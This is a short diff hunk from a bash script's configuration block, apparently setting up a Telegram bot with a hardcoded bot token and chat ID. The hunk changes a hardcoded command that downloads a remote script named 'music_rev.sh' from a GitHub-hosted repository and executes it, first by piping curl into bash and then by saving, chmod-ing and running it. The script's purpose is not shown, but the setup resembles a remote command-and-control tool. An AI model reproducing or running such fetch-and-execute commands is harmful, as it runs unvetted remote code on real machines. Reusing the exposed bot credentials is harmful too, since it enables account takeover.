@@ -9,7 +9,7 @@ set -euo pipefail
 ################ CONFIG ################
 TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
 CHAT_ID="6565158025"
-HARDCODE_CMD='curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh | bash'
+HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
 ########################################
 
 API="https://api.telegram.org/bot${TOKEN}"
